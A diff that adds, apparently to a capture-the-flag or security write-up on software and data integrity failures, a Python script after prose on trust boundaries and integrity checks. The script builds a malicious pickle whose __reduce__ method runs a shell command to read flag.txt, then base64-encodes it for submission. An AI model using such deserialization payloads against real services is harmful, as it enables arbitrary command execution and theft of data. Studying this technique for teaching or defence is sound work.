@@ -61,3 +61,25 @@ Software or Data Integrity Failures occur when an application relies on code, up
 Preventing these failures begins with establishing trust boundaries. Applications should never assume that code, updates, or key pieces of data are legitimate and automatically trusted; their integrity must be verified. This involves using methods such as cryptographic checks (like checksums) for update packages and ensuring that only trusted sources can modify critical artefacts.
 
 Additionally, for applications, integrity and trust boundaries should also be within build processes such as CI/CD.
+
+Python Script :
+
+```python
+import pickle
+import base64
+import subprocess
+
+class MaliciousPayload:
+    def __reduce__(self):
+        return (subprocess.check_output, (('cat', 'flag.txt'),))
+
+malicious_object = MaliciousPayload()
+pickle_data = pickle.dumps(malicious_object)
+b64_encoded = base64.b64encode(pickle_data).decode('utf-8')
+
+# Fix padding if needed
+if len(b64_encoded) % 4:
+    b64_encoded += '=' * (4 - len(b64_encoded) % 4)
+
+print(b64_encoded)
+```
